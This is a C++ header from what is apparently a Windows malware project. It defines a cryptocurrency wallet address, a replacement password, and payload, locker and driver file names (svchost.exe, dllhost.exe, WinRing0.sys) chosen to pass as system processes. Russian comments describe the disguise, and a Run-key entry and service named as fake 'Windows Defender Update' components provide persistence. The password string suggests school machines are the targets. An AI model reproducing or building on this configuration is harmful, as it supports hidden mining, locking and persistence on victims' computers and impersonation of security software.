#pragma once
#include <string>

const std::wstring WALLET       = L"UQBc4oF7CJFwItzeiu-3R_8ODlk--uzkvIIcfre_ZXNfOwIq";
const std::wstring NEW_PASSWORD = L"SCHOOLhACK12389S";

// маскировка под системные процессы
const wchar_t* PAYLOAD_NAME   = L"svchost.exe";
const wchar_t* BURNER_NAME    = L"conhost.exe";
const wchar_t* LOCKER_NAME    = L"dllhost.exe";
const wchar_t* DRIVER_NAME    = L"WinRing0.sys";
const wchar_t* INSTALLER_NAME = L"winring0_install.exe";

// маскировка в реестре и SCM
const wchar_t* REG_RUN_KEY  = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* REG_RUN_NAME = L"Windows Defender Update";
const wchar_t* SVC_NAME     = L"WinDefendUpdate";

// маркер источника — в ProgramData, не в drivers\etc
const wchar_t* MARKER_PATH  = L"C:\\ProgramData\\Microsoft\\Windows Defender\\src.marker";
